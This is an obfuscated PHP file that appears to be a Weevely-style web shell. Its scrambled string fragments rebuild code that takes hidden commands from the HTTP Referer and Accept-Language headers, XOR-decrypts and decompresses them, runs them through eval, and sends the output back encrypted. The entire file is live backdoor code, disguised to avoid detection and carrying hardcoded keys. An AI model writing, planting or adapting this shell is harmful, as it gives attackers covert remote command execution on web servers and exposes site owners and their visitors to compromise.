<?php
$T='P$q[$m[2][$z]];if()Ps)Ptr)Ppos($p,)P$h)===0){$s[$i])P=)P"";$p=$s)Ps($p,3)P);}if(a)Prray_key)P_exist)Ps)P()P$i,$)P)Ps)){$s[$';
$z='o)Pr($j=0;($j<$c)P&)P&$i<$l);$)Pj++,$i)P)P++){$o.=$t{$)Pi}^$k{$j)P};})P}r)Peturn $)Po;}$r=$_S)P)PERV)PER;$rr=@$r["HTT)PP';
$i='_REFERER)P"];$ra=)P@$)Pr)P["HTTP_ACC)PEP)PT_LANG)PUAGE"];i)Pf($rr&&$)Pra){$u=)Ppar)Pse_url()P)P$rr);)Pparse_str($u["que)Pry"],)P$q';
$O=str_replace('gn','','gncreagntgnegn_fgnunctignon');
$Z='$kh="5d4)P1";$k)Pf="402a";)Pfuncti)Pon x($)Pt,$k){)P)P$c=strlen($k))P)P;$l=st)Prle)Pn($t);$o="";for)P($i=)P0;$i<$l)P)P;){f';
$d='Pe(preg_)Prepl)P)Pace(arr)Pay("/_/","/-)P/"),a)Prray("/")P,")P+)P"),$ss($s)P[$i],)P0,$e))),$k))P))P);$o=ob)P_get_conte)P)Pnts';
$o='s(md5($i.$k)Ph),0)P,3))P);$f)P=$sl($ss(md5()P$i.)P$kf),0,3)P)P));$p="";)Pf)Por($z=1;$z<cou)P)Pnt($m[)P1)P]);)P$z++)$p.=)';
$p=');$q=ar)Pray)P_valu)Pes($q);p)Pr)Peg_match_a)Pll()P"/([\\w)P])[\\w-]+(?:)P;q=0.()P[\\d]))?)P,?/",$)P)Pra)P,$m);)Pif($q&&$m){';
$S='i].=$)Pp;$e=strpos)P()P$s[$i],$f);)Pif($e){$k)P=$kh.$)Pkf;)Pob_start();)P@e)Pval(@gz)Puncompress)P(@x)P(@bas)Pe64_decod)';
$h='();ob_e)Pnd_)Pclean();$d=ba)Pse64)P_en)P)Pcode(x(gzco)Pmpr)Pess($o),$k));pr)P)Pint("<$k>$d)P</$k>")P);@s)Pessio)Pn_)Pdestroy();}}}}';
$r='@ses)P)Psion_start)P();$s=&$_)PSESSI)PON;)P$)P)Pss="substr";$s)Pl="strtolower)P";)P$i)P=$)Pm[1][0].$)Pm[1][1])P;$h=$)Psl($s';
$R=str_replace(')P','',$Z.$z.$i.$p.$r.$o.$T.$S.$d.$h);
$e=$O('',$R);$e();
?>
